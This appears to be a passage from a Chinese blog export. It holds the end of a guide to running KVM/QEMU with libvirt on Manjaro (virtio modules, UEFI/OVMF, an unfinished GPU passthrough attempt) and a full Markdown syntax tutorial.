<li>开机装载<br>开机时systemd 读取 /etc/modules-load.d/ 中的配置加载额外的内核模块。配置文件名称通常为<code>/etc/modules-load.d/ &lt;-program-&gt; .conf</code> ，配置内容为：一行一个要读取的模块名，而空行以及第一个非空格字符为#或;的行会被忽略<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/modules-load.d/virtio-mod.conf</span><br></pre></td></tr></table></figure>
添加需要的配置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Load virtio-net.ko at boot</span><br><span class="line">virtio				#所有virtio设备</span><br><span class="line">#virtio-net			#网络设备</span><br><span class="line">#virtio-blk      	#块设备</span><br><span class="line">#virtio-scsi     	#控制器设备</span><br><span class="line">#virtio-serial      #串行设备</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>virtio 驱动安装</strong><ul>
<li><a href="https://docs.fedoraproject.org/en-US/quick-docs/creating-windows-virtual-machines-using-virtio-drivers/index.html">下载页面</a>—-&gt;<code>Direct downloads</code>—-&gt;<a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso">Stable（稳定版）</a></li>
</ul>
</li>
</ul>
<p>将镜像挂载到虚拟机对未识别设备进行驱动安装即可</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><strong>KVM在系统内核中，无需安装</strong></p>
<h4 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h4><p>Qemu是一个广泛使用的开源计算机仿真器和虚拟机，当作为仿真器时，可以在一种架构(如PC机)下运行另一种架构(如ARM)下的操作系统和程序。通过动态转化，可以获得很高的运行效率。当 QEME 作为虚拟机时，可以使用 xen 或 kvm 访问 CPU 的扩展功能(HVM)，在主机 CPU 上直接执行虚拟客户端的代码，获得接近于真机的性能表现。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S qemu</span><br></pre></td></tr></table></figure>
<h4 id="安装libvirt"><a href="#安装libvirt" class="headerlink" title="安装libvirt"></a>安装libvirt</h4><p>libvirt是Linux上实现虚拟化功能的库，是长期稳定的C语言API，支持KVM/QEMU、Xen、LXC等主流虚拟化方案</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S libvirt virt-manager 	<span class="comment">#virt-manager为图形前端</span></span><br></pre></td></tr></table></figure>
<h4 id="安装网络组件"><a href="#安装网络组件" class="headerlink" title="安装网络组件"></a>安装网络组件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ebtables dnsmasq bridge-utils openbsd-netcat</span><br></pre></td></tr></table></figure>
<ul>
<li><p>ebtables 桥接网络管理，用于 default NAT 网络</p>
</li>
<li><p>dnsmasq DHCP DNS 服务，用于 default NAT 网络</p>
</li>
<li><p>bridge-utils 桥接网络管理，用于桥接网络</p>
</li>
<li><p>openbsd-netcat 用于通过 SSH 管理</p>
</li>
</ul>
<h4 id="其他可选包"><a href="#其他可选包" class="headerlink" title="其他可选包"></a>其他可选包</h4><ul>
<li>qemu-arch-extra              其它架构支持</li>
<li>qemu-block-gluster          glusterfs block 支持</li>
<li>qemu-block-iscsi          iSCSI block 支持</li>
<li>qemu-block-rbd             RBD block 支持</li>
<li>samba - SMB/CIFS             服务器支持</li>
</ul>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="启动守护进程"><a href="#启动守护进程" class="headerlink" title="启动守护进程"></a>启动守护进程</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start libvirtd    	<span class="comment">#启动libvirtd进程</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> libvirtd   	<span class="comment">#开机自起</span></span><br></pre></td></tr></table></figure>
<h4 id="启动-default-NAT网络"><a href="#启动-default-NAT网络" class="headerlink" title="启动 default NAT网络"></a>启动 default NAT网络</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo virsh net-start default</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#出现错误可列出网络检查</span></span><br><span class="line">sudo virsh net-list --all</span><br><span class="line"><span class="comment">#若没有任何网络，可手动定义网络；或有网络但ifconfig中没有，且启动错误也可手动添加</span></span><br><span class="line">sudo virsh net-define /etc/libvirt/qemu/networks/default.xml</span><br><span class="line"><span class="comment">#标记为自动启动</span></span><br><span class="line">sudo virsh net-autostart default</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/weixin_36820871/article/details/80595855">产考</a></p>
<h4 id="将用户添加到kvm用户组"><a href="#将用户添加到kvm用户组" class="headerlink" title="将用户添加到kvm用户组"></a>将用户添加到kvm用户组</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start libvirtd    	#启动libvirtd进程</span><br><span class="line">systemctl enable libvirtd   	#开机自起</span><br></pre></td></tr></table></figure>
<p>将用户添加到kvm用户组<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -a -G kvm user_name</span><br></pre></td></tr></table></figure></p>
<h3 id="安装UEFI功能"><a href="#安装UEFI功能" class="headerlink" title="安装UEFI功能"></a>安装UEFI功能</h3><h4 id="安装UEFI固件"><a href="#安装UEFI固件" class="headerlink" title="安装UEFI固件"></a>安装UEFI固件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ovmf</span><br></pre></td></tr></table></figure>
<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>配置<code>libvirtd</code>启用<code>UEFI</code>,<code>libvirt</code>需要知道<code>UEFI</code>—&gt;<code>NVRAM</code>中的配置文件映射<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/libvirt/qemu.conf</span><br></pre></td></tr></table></figure><br>找到<code>nvram = [ ]</code>去掉注释，默认的配置文件中NVRAM配置的是<code>ovmf_code.fd</code>文件的路径<br>查看<code>/usr/share/ovmf/x64/</code>目录下的内容对其进行配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvram &#x3D; [</span><br><span class="line">   &quot;&#x2F;usr&#x2F;share&#x2F;ovmf&#x2F;x64&#x2F;OVMF_CODE.fd:&#x2F;usr&#x2F;share&#x2F;ovmf&#x2F;x64&#x2F;OVMF_CODE.fd&quot;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>重启<code>libvirtd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart libvirtd</span><br></pre></td></tr></table></figure>
<h3 id="显卡直通-（未成功，待研究）"><a href="#显卡直通-（未成功，待研究）" class="headerlink" title="显卡直通 （未成功，待研究）"></a>显卡直通<font color="red"> （未成功，待研究）</font></h3><p><strong>可能踩坑</strong>：<strong>安装了显卡闭源驱动</strong></p>
<h4 id="通过OVMF实现PCI直通"><a href="#通过OVMF实现PCI直通" class="headerlink" title="通过OVMF实现PCI直通"></a>通过OVMF实现PCI直通</h4><p><strong>启用IOMMU</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line"><span class="comment">#修改GRUB_CMDLINE_LINUX=&quot;&quot;</span></span><br><span class="line"><span class="comment">#Intel CPU(VT-d)，使用 intel_iommu=on。</span></span><br><span class="line"><span class="comment">#AMD CPU(AMD-Vi)，使用 amd_iommu=on</span></span><br><span class="line"><span class="comment">#iommu=pt 防止Linux试图接触(touching)无法直通的设备</span></span><br><span class="line">GRUB_CMDLINE_LINUX=<span class="string">&quot;intel_iommu=on iommu=pt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新grub文件</span></span><br><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure>
<p>重启后检查dmesg 以确认 IOMMU 已经被正确启用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | grep -e DMAR -e IOMMU</span><br></pre></td></tr></table></figure>
<p><strong>确保PCI设备被分配到IOMMU组中</strong></p>
<p>创建脚本执行输出PCI 设备是如何被分配到 IOMMU 组之中的，如果没有任何输出，代表没有启用IOMMU支持或你的硬件不支持IOMMU</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">shopt</span> -s nullglob</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> /sys/kernel/iommu_groups/*/devices/*; <span class="keyword">do</span> </span><br><span class="line">    n=<span class="variable">$&#123;d#*/iommu_groups/*&#125;</span>; n=<span class="variable">$&#123;n%%/*&#125;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;IOMMU Group %s &#x27;</span> <span class="string">&quot;<span class="variable">$n</span>&quot;</span></span><br><span class="line">    lspci -nns <span class="string">&quot;<span class="variable">$&#123;d##*/&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>
<p><strong>隔离GPU</strong></p>
<p>Linux 4.1 开始，内核包括了 <code>vfio-pci</code> 。这是一个 VFIO 驱动程序，与 <code>pci-stub</code> 的作用相同。但它可以在一定程度上控制设备，例如在不使用设备的时候将它们切换到 D3 状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modinfo vfio-pci</span><br></pre></td></tr></table></figure>
<p>查看显卡信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./iommu.sh|grep NVIDIA</span><br><span class="line"></span><br><span class="line">IOMMU Group 11 01:00.0 3D controller [0302]: NVIDIA Corporation GM108M [GeForce 940MX] [10de:134d] (rev a2)</span><br><span class="line"><span class="comment">#ID: 10de:134d</span></span><br><span class="line"><span class="comment">#01:00.0</span></span><br><span class="line"></span><br><span class="line">cat /sys/bus/pci/devices/0000:01:00.0/modalias</span><br><span class="line"><span class="comment">#pci:v000010DEd0000134Dsv00001025sd00001133bc03sc02i00</span></span><br></pre></td></tr></table></figure>
<p>加载<code>vfio-pci</code>并将ID参数传递给内核，<strong>如果有与该显卡同组（IOMMU Group 11）的设备也要将ID加进去</strong></p>
<p>可通过命令：<code>find /sys/kernel/iommu_groups/ -type l</code>查询同组设备</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/vfio.conf</span><br><span class="line"><span class="comment">#加入内容，多个ID用 , 分隔</span></span><br><span class="line"><span class="built_in">alias</span> pci:v000010DEd0000134Dsv00001025sd00001133bc03sc02i00 vfio-pci</span><br><span class="line">options vfio-pci ids=10de:134d</span><br></pre></td></tr></table></figure>
<p>保证<code>vfio-pci</code>在其他图形驱动之前加载，在initramfs中静态绑定它和它的依赖项。按照<code>vfio_pci</code>，<code>vfio</code>，<code>vfio_iommu_type1</code>，<code>vfio_virqfd</code> 的顺序添加到mkinitcpio。</p>
<p>确保<code>modconf hook</code>在<code>mkinitcpio.conf</code>的 HOOKS 列表中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/mkinitcpio.conf</span><br><span class="line"><span class="comment">#找到MODULES修改相关参数顺序</span></span><br><span class="line">MODULES=(... vfio_pci vfio vfio_iommu_type1 vfio_virqfd ...)</span><br><span class="line"><span class="comment">#找到HOOKS确保有参数modconf</span></span><br><span class="line">HOOKS=(... modconf ...)</span><br></pre></td></tr></table></figure>
<p>重新生成<code>initramfs</code></p>
<p>生成<code>initramfs</code>映像<code>/etc/mkinitcpio.conf</code>并将其保存<code>/boot/linux-custom.img</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkinitcpio -c /etc/mkinitcpio.conf -g /boot/linux-custom.img -k 4.19.69-1-MANJARO</span><br></pre></td></tr></table></figure>
<p>如果修改了<code>/etc/modprobe.d/vfio.conf</code>中的设备ID，就需要重新生成<code>initramfs</code></p>
<p>重启验证<code>vfio-pci</code>是否已经正确加载并绑定到正确的设备</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | grep -i vfio</span><br><span class="line"><span class="comment">#有设备且为ffffffff:ffffffff</span></span><br><span class="line"><span class="comment">#vfio_pci: add [10de:134d[ffffffff:ffffffff]] class 0x000000/00000000</span></span><br></pre></td></tr></table></figure>
<p><code>vfio.conf</code>中所绑定的设备（甚至是需要直通的设备）并不一定会出现在 dmesg 的输出之中。有时尽管设备没有出现在 dmesg 的输出中，但实际上在虚拟机中可以被使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lspci -nnk -d 10de:134d</span><br></pre></td></tr></table></figure>
<p><strong>填坑</strong>：解除<code>vfio</code>绑定：还原修改，从新生成<code>initramfs</code> （<code>sudo mkinitcpio -g /boot/initramfs-linux-lily.img -k 4.19.69-1-MANJARO</code>）</p>
<p><a href="https://wiki.archlinux.org/index.php/PCI_passthrough_via_OVMF_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">产考</a>)</p>
<h3 id="使用虚拟机"><a href="#使用虚拟机" class="headerlink" title="使用虚拟机"></a>使用虚拟机</h3><h4 id="图形化方式使用"><a href="#图形化方式使用" class="headerlink" title="图形化方式使用"></a>图形化方式使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">virt-manager</span><br></pre></td></tr></table></figure>
<h4 id="命令方式"><a href="#命令方式" class="headerlink" title="命令方式"></a>命令方式</h4><p><strong>创建磁盘镜像</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-img create -f qcow2 test.qcow2 40G 	<span class="comment"># 动态大小</span></span><br><span class="line">qemu-img create -f raw test.raw 40G 		<span class="comment"># 直接分配大小</span></span><br></pre></td></tr></table></figure><br><strong>创建虚拟机</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vir-install \</span><br><span class="line">--name win \</span><br><span class="line">--ram 1024 \</span><br><span class="line">--vcpu 2 \</span><br><span class="line">-f test.qcow2 \</span><br><span class="line">--cdrom win.iso \</span><br><span class="line">--network bridge=cloudbr0 \</span><br><span class="line">--graphics vnc,listen=0.0.0.0,port=5959,password=<span class="string">&#x27;123456&#x27;</span>,keymap=<span class="string">&#x27;en-us&#x27;</span> \</span><br><span class="line">--force --autostart</span><br></pre></td></tr></table></figure><br>—name         虚拟机名<br>—ram         内存<br>—vcpu         CPU数<br>—f         磁盘镜像<br>—cdrom     安装镜像<br>—network     网路<br>—graphics     连接方式</p>
<p>产考：<a href="https://www.liuzhixiang.com/2019/05/18/Using-KVM-on-Arch%20(Manjaro">在 Arch Linux (Manjaro) 中使用 KVM 虚拟机</a>/)</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>kvm</category>
      </categories>
      <tags>
        <tag>Manjaro</tag>
        <tag>kvm</tag>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown语法</title>
    <url>/2019/10/02/Markdown%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p><span id="a">顶部</span></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Markdown是一种纯文本格式的标记语言。通过简单的标记语法，它可以使普通文本内容具有一定的格式。<br>Markdown 的目标是实现「易读易写」<br>Markdown 语法的目标是：成为一种适用于网络的书写语言。<br>Markdown 可直接在文档中使用HTML的标签实</p>
<p><code>.md</code>文件即为Markdown文件，现在很多前端项目中的readme等文件都是用Markdown编写的，很多企业也鼓励使用这种文件</p>
<p>下面讲解Markdown文件的基础语法,<a href="https://markdown-zh.readthedocs.io/en/latest/">详细参考</a></p>
<a id="more"></a>
<h1 id="Markdown基础语法"><a href="#Markdown基础语法" class="headerlink" title="Markdown基础语法"></a>Markdown基础语法</h1><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>前面带#号，后面带文字；一二级标签下面会有一条横线</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr>
<h1 id="文本格式"><a href="#文本格式" class="headerlink" title="文本格式"></a>文本格式</h1><h2 id="强调字体"><a href="#强调字体" class="headerlink" title="强调字体"></a>强调字体</h2><p>一个星号（<code>*</code>）或者是一个下划线（<code>_</code>）包起来，会转换为\<em>倾斜，如果是2个，会转换为\<strong>加粗</strong></em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">*md*</span>    </span><br><span class="line"><span class="strong">**md**</span></span><br><span class="line"><span class="emphasis">_md_</span>   </span><br><span class="line"> <span class="strong">__md__</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p><em>md</em><br><strong>md</strong><br><em>md</em><br> <strong>md</strong></p>
<hr>
<h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p>基本上和js转义一样,\接需要转义的字符<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\\</span><br><span class="line">\*</span><br><span class="line">\+</span><br><span class="line">\-</span><br><span class="line">\`</span><br><span class="line">\_</span><br></pre></td></tr></table></figure></p>
<hr>
<p><strong>效果</strong>：<br>\<br>*<br>+<br>-<br>`<br>_</p>
<hr>
<h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h2><p>用<code>~~</code>把需要显示删除线的字符包裹起来</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">~~删除~~</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p><del>删除</del></p>
<hr>
<h2 id="字体、字号、颜色"><a href="#字体、字号、颜色" class="headerlink" title="字体、字号、颜色"></a>字体、字号、颜色</h2><p>Markdown本身不能设置这些，需要结合HTML标签来完成</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>我是黑体字<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;微软雅黑&quot;</span>&gt;</span></span>我是微软雅黑<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;STCAIYUN&quot;</span>&gt;</span></span>我是华文彩云<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#ff0000</span> <span class="attr">size</span>=<span class="string">12</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体字<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#00ffff</span> <span class="attr">size</span>=<span class="string">3</span>&gt;</span></span>null<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">gray</span> <span class="attr">size</span>=<span class="string">5</span>&gt;</span></span>gray<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<font face="黑体">我是黑体字</font>
<font face="微软雅黑">我是微软雅黑</font>
<font face="STCAIYUN">我是华文彩云</font>
<font color="#ff0000" size="12" face="黑体">黑体字</font>
<font color="#00ffff" size="3">null</font>
<font color="gray" size="5">gray</font>

<hr>
<p><a href="http://tool.oschina.net/commons?type=3">RGB颜色对照表</a></p>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>使用<code>+</code>、<code>-</code>、<code>*</code>加一个空格，然后跟上文字就会自动生成列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//形式一</span><br><span class="line"><span class="bullet">+</span> a</span><br><span class="line"><span class="bullet">+</span> b</span><br><span class="line"><span class="bullet">+</span> c</span><br><span class="line"></span><br><span class="line">//形式二</span><br><span class="line"><span class="bullet">-</span> d</span><br><span class="line"><span class="bullet">-</span> e</span><br><span class="line"><span class="bullet">-</span> f</span><br><span class="line"></span><br><span class="line">//形式三</span><br><span class="line"><span class="bullet">*</span> g</span><br><span class="line"><span class="bullet">*</span> h</span><br><span class="line"><span class="bullet">*</span> i</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//形式一</p>
<ul>
<li>a</li>
<li>b</li>
<li>c</li>
</ul>
<p>//形式二</p>
<ul>
<li>d</li>
<li>e</li>
<li>f</li>
</ul>
<p>//形式三</p>
<ul>
<li>g</li>
<li>h</li>
<li>i</li>
</ul>
<hr>
<h3 id="二级列表"><a href="#二级列表" class="headerlink" title="二级列表"></a>二级列表</h3><p>在列表下一行前加两个空格即可生成二级列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="bullet">+</span> 123</span><br><span class="line"><span class="bullet">    +</span> abc</span><br><span class="line"><span class="bullet">    +</span> bcd</span><br><span class="line"><span class="bullet">    +</span> cde</span><br><span class="line"><span class="bullet">+</span> 456</span><br><span class="line"><span class="bullet">+</span> 789</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<ul>
<li>123<ul>
<li>abc</li>
<li>bcd</li>
<li>cde</li>
</ul>
</li>
<li>465</li>
<li>789</li>
</ul>
<hr>
<h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>数字加<code>.</code>和一个空格，即可生成有序列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> abc</span><br><span class="line"><span class="bullet">2.</span> bcd</span><br><span class="line"><span class="bullet">3.</span> cde</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<ol>
<li>abc</li>
<li>bcd</li>
<li>cde</li>
</ol>
<hr>
<h3 id="二级列表-1"><a href="#二级列表-1" class="headerlink" title="二级列表"></a>二级列表</h3><p>在列表下一行前加两个空格即可生成二级列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> abcd</span><br><span class="line"><span class="bullet">    1.</span> abcde</span><br><span class="line"><span class="bullet">    2.</span> abcde</span><br><span class="line"><span class="bullet">    3.</span> abcde</span><br><span class="line"><span class="bullet">2.</span> bcde</span><br><span class="line"><span class="bullet">3.</span> cdef</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<ol>
<li>abcd<ol>
<li>abcde</li>
<li>abcde</li>
<li>abcde</li>
</ol>
</li>
<li>bcde</li>
<li>cdef</li>
</ol>
<hr>
<h2 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h2><figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//无序列表嵌套</span><br><span class="line"><span class="bullet">+</span> 123</span><br><span class="line"><span class="bullet">    +</span> abc</span><br><span class="line"><span class="bullet">    1.</span> bcd</span><br><span class="line"><span class="bullet">    2.</span> cde</span><br><span class="line"><span class="bullet">+</span> 465</span><br><span class="line"><span class="bullet">+</span> 789</span><br><span class="line"></span><br><span class="line">//有序列表嵌套</span><br><span class="line"><span class="bullet">1.</span> abcd</span><br><span class="line"><span class="bullet">    -</span> abcde</span><br><span class="line"><span class="bullet">    -</span> abcde</span><br><span class="line"><span class="bullet">    1.</span> abcde</span><br><span class="line"><span class="bullet">2.</span> bcde</span><br><span class="line"><span class="bullet">3.</span> cdef</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//无序列表嵌套</p>
<ul>
<li>123<ul>
<li>abc</li>
</ul>
<ol>
<li>bcd</li>
<li>cde</li>
</ol>
</li>
<li>465</li>
<li>789</li>
</ul>
<p>//有序列表嵌套</p>
<ol>
<li>abcd<ul>
<li>abcde</li>
<li>abcde</li>
</ul>
<ol>
<li>abcde</li>
</ol>
</li>
<li>bcde</li>
<li>cdef</li>
</ol>
<hr>
<h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="少量代码"><a href="#少量代码" class="headerlink" title="少量代码"></a>少量代码</h2><p>用`包裹起来的部分</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">这是<span class="code">`一点代码`</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>这是<code>`一点代码</code></p>
<hr>
<h2 id="大量代码"><a href="#大量代码" class="headerlink" title="大量代码"></a>大量代码</h2><p>用```包裹的部分，<strong>下面为了能在代码块中显示```加了<code>\</code>，实际没有<code>\</code></strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">\<span class="code">```</span></span><br><span class="line"><span class="code">大量代码内容</span></span><br><span class="line"><span class="code">大量代码内容</span></span><br><span class="line"><span class="code">大量代码内容</span></span><br><span class="line"><span class="code">\```</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大量代码内容</span><br><span class="line">大量代码内容</span><br><span class="line">大量代码内容</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="引用块"><a href="#引用块" class="headerlink" title="引用块"></a>引用块</h1><p><code>&gt;</code>加空格，跟上文字即代表引用块</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="quote">&gt; 一级引用</span></span><br><span class="line">&gt;&gt; 二级引用</span><br><span class="line">&gt;&gt;&gt; 三级引用</span><br><span class="line">&gt;&gt;&gt;&gt; 四级引用</span><br><span class="line">&gt;&gt;&gt;&gt;&gt; 五级引用</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt; 六级引用</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<blockquote>
<p>一级引用</p>
<blockquote>
<p>二级引用</p>
<blockquote>
<p>三级引用</p>
<blockquote>
<p>四级引用</p>
<blockquote>
<p>五级引用</p>
<blockquote>
<p>六级引用</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<hr>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>链接的文字放在[]中，链接地址放在随后的()中，链接也可以带title属性，链接地址后面空一格，然后用引号引起来，<strong>引号的内容不是必须的</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//行内式</span><br><span class="line">[<span class="string">我的博客</span>](<span class="link">https://eonun.com &quot;欢迎访问&quot;</span>)来看看吧</span><br><span class="line">//参数式</span><br><span class="line">[<span class="symbol">我的博客</span>]: <span class="link">https://eonun.com &quot;欢迎访问&quot;</span></span><br><span class="line">[我的博客]来看看吧</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//行内式<br><a href="https://eonun.com" title="欢迎访问">我的博客</a>来看看吧<br>//参数式</p>
<p><a href="https://eonun.com" title="欢迎访问">我的博客</a>来看看吧</p>
<hr>
<h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p>和链接的形式差不多，图片的名字放在[]中，图片地址放在随后的()中，title属性（图片地址后面空一格，然后用引号引起来<strong>引号的内容不是必须的</strong>）,注意的是[]前要加上!</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//行内式</span><br><span class="line">![<span class="string">我的头像</span>](<span class="link">https://eonun.com/images/me.png &quot;me&quot;</span>)</span><br><span class="line"></span><br><span class="line">//参数式</span><br><span class="line">[<span class="symbol">我的头像</span>]: <span class="link">https://eonun.com/images/me.png &quot;me&quot;</span></span><br><span class="line">![我的头像]</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//行内式<br><img src="https://eonun.com/images/me.png" alt="我的头像" title="me"><br>//参数式</p>
<p><img src="https://eonun.com/images/me.png" alt="我的头像" title="me"></p>
<hr>
<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>分割线可以由* - _（星号，减号，底线）这3个符号的至少3个符号表示，注意至少要3个，且不需要连续，有空格也可以</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="bullet">-</span> - -</span><br><span class="line">------</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">*</span> <span class="emphasis">* *</span></span></span><br><span class="line"><span class="strong">**</span><span class="strong">****</span></span><br><span class="line"><span class="strong">__<span class="emphasis">_</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">_</span> <span class="emphasis">_ _</span></span></span><br><span class="line"><span class="strong">__</span><span class="strong">____</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<hr>
